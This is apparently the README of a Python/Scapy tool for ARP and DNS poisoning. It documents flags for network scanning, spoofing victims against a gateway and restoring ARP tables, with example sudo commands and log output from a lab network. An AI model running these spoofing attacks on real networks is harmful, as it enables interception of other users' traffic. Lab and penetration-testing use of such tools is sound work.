# ARPython
An APR and DNS poisoning tool writting in python.

### Requirements

1. Linux based system
2. Python 2.7
3. Scapy installed
4. Python TKinter installed if you want to use the GUI

### Usage

To use the tool you will need to download/clone all the files. If you don't want to use the GUI you can leave the gui.py file out.
This script needs elevated rights for some actions. To launch navigate to the folder and use command `sudo python arppython.py`.
A help command will come up that will be pretty self explanatory. All possible flags will be listed here though.

`-h. --help` - Prints the help screen

`-g, --gui` - Opens the GUI

`-a, --arp {s,silent,n,normal,r,restore}` - Use this command to start ARP poisoning. Specify either the silent or non-silent method or the restore method which will restore the ARP tables

`-p, --packets AMOUNT` - Specify a custom amount of packets for the normal ARP poison attack

`-vi, --victim VICTIM` - Specify the IP address of the victim

`-gt, --gateway GATEWAY` - Specify the IP address of the gateway to use for the attack

`-vm, --victimmac VICTIMMAC` - Specify the mac address of the victim, can be left blank. If blank the script with grab the mac address from the specified victim IP. If you want multiple victims just separate them by comma and the program will start attacking them simultaneously

`-gm, --gatewaymac GATEWAYMAC` - Specify the mac address of the gateway, can be left blank just as the victim MAC

`-am, --attackermac ATTACKERMAC` - Specify a custom attacker MAC address for the attacker, if left blank the current machines MAC will be used

`-s, --scan` - Scans which network interfaces are available and prints information about them

`-si, --scaniface IFACE` - Scans a given network interface for active IP and MAC addresses. Just specifying the IP address is enough for this command

`-d, --debug` - Set the logging level to debug

`-v, --verbose` - Set the logging level to verbose

When the tool is busy it can at any point be interrupted by using `CTRL + C`. All the logging info will also be saved to log.txt where you can see exactly what happened.

### Examples

Some examples to show usage

Doing a scan, scan interface and then normal ARP poisoning attack with 5 packets

```buildoutcfg
sudo python arpython.py -s
2019-03-31 22:50:35,567 - INFO - Scanning for interfaces
2019-03-31 22:50:35,569 - INFO - The following interfaces are present: 
2019-03-31 22:50:35,569 - INFO - 10.0.3.0/24, enp0s8
2019-03-31 22:50:35,569 - INFO - 169.254.0.0/16, enp0s3
2019-03-31 22:50:35,569 - INFO - 192.168.56.0/24, enp0s3

sudo python arpython.py -si 192.168.56
2019-03-31 22:50:58,794 - INFO - Matching the interface
2019-03-31 22:50:58,795 - INFO - Scanning for devices
2019-03-31 22:50:58,795 - INFO - Using scapy arping with 192.168.56.0/24 on enp0s3
2019-03-31 22:51:04,040 - INFO - 0a:00:27:00:00:10 192.168.56.1
2019-03-31 22:51:04,040 - INFO - 08:00:27:92:de:10 192.168.56.100

sudo python arpython.py -a n -vi 192.168.56.100 -gt 192.168.56.1 -p 5
2019-03-31 22:53:54,270 - INFO - Grabbing the victims MAC address(es) since nothing was specified
2019-03-31 22:53:54,377 - INFO - 08:00:27:92:de:10
2019-03-31 22:53:54,378 - INFO - Grabbing the gateways MAC address since nothing was specified
2019-03-31 22:53:54,473 - INFO - 0a:00:27:00:00:10
2019-03-31 22:53:54,473 - INFO - Starting ARP Poison
2019-03-31 22:53:54,474 - INFO - Start spoofing network on 192.168.56.100
2019-03-31 22:53:54,474 - INFO - Starting iteration 0 for 192.168.56.100
2019-03-31 22:53:54,475 - INFO - Spoofing 192.168.56.100
.
.
2019-03-31 22:54:02,907 - INFO - Starting iteration 4 for 192.168.56.100
2019-03-31 22:54:02,908 - INFO - Spoofing 192.168.56.100
2019-03-31 22:54:05,028 - INFO - Done spoofing

sudo python arpython.py -a r -vi 192.168.56.100 -gt 192.168.56.1
2019-03-31 23:05:54,418 - INFO - Grabbing the victims MAC address(es) since nothing was specified
2019-03-31 23:05:54,553 - INFO - 08:00:27:92:de:10
2019-03-31 23:05:54,553 - INFO - Grabbing the gateways MAC address since nothing was specified
2019-03-31 23:05:54,637 - INFO - 0a:00:27:00:00:10
2019-03-31 23:05:54,638 - INFO - Starting ARP Restore
2019-03-31 23:05:54,640 - INFO - Starting ARP restoration for 192.168.56.100
2019-03-31 23:05:54,758 - INFO - Restoration successful
```